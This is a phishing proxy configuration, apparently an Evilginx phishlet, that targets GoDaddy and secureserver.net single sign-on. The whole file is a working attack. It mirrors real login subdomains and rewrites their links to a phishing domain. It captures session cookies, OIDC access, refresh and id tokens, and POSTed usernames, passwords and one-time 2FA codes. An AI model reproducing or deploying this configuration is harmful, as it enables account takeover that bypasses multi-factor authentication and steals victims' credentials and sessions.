min_ver: '3.0.0'
author: '0fukuAkz'
proxy_hosts:
  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'email', orig_sub: 'email', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'mya', orig_sub: 'mya', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'godaddy.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'img1', orig_sub: 'img1', domain: 'wsimg.com', session: false, is_landing: false, auto_filter: false}

sub_filters:
  # Primary SSO responses
  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'secureserver.net', search: 'https://sso\.secureserver\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'sso.godaddy.com', orig_sub: 'mya', domain: 'godaddy.com', search: 'https://mya\.godaddy\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'sso.godaddy.com', orig_sub: 'account', domain: 'godaddy.com', search: 'https://account\.godaddy\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'sso.godaddy.com', orig_sub: 'www', domain: 'godaddy.com', search: 'https://www\.godaddy\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'sso.godaddy.com', orig_sub: 'img1', domain: 'wsimg.com', search: 'https://img1\.wsimg\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}

  # secureserver responses redirect back to godaddy
  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://sso\.godaddy\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'sso.secureserver.net', orig_sub: 'email', domain: 'secureserver.net', search: 'https://email\.secureserver\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}

  # account/mya cross-references
  - {triggers_on: 'account.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://sso\.godaddy\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'mya.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://sso\.godaddy\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}

auth_tokens:
  # GoDaddy SSO session cookies
  - domain: 'sso.godaddy.com'
    keys: ['auth_idp', 'auth_idp_ref', 'info_idp', 'market', 'currency', 'akaas_godaddy', 'visitor']
    type: 'cookie'
    search: ''

  # Broad GoDaddy domain cookies
  - domain: '.godaddy.com'
    keys: ['cid', 'gdps', 'traffic_phkey', 'logged_in', 'market', 'currency']
    type: 'cookie'
    search: ''

  # secureserver SSO cookies
  - domain: 'sso.secureserver.net'
    keys: ['secureserver_auth', 'ss_refresh', 'ss_session']
    type: 'cookie'
    search: ''

  - domain: '.secureserver.net'
    keys: ['traffic_phkey', 'market', 'currency']
    type: 'cookie'
    search: ''

  # Account subdomain cookies
  - domain: 'account.godaddy.com'
    keys: ['info_shopper', 'info_cart']
    type: 'cookie'
    search: ''

  # OIDC token capture from JSON response bodies
  - domain: 'sso.godaddy.com'
    path: '.*'
    name: 'gd_access_token'
    search: '"access_token"\s*:\s*"([^"]+)"'
    type: 'body'
  - domain: 'sso.godaddy.com'
    path: '.*'
    name: 'gd_refresh_token'
    search: '"refresh_token"\s*:\s*"([^"]+)"'
    type: 'body'
  - domain: 'sso.godaddy.com'
    path: '.*'
    name: 'gd_id_token'
    search: '"id_token"\s*:\s*"([^"]+)"'
    type: 'body'

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'

  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

  custom:
    # Alternative GoDaddy login field
    - {key: 'loginName', search: '(.*)', type: 'post'}
    # 2FA / OTP codes
    - {key: 'code', search: '(.*)', type: 'post'}
    - {key: 'otp', search: '(.*)', type: 'post'}
    - {key: 'pin', search: '(.*)', type: 'post'}

auth_urls:
  - '/v1/api/idp/login'
  - '/v1/auth/token'
  - '/login/idp'
  - '/oidc/token'
  - '/v1/api/token'

login:
  domain: 'sso.godaddy.com'
  path: '/'
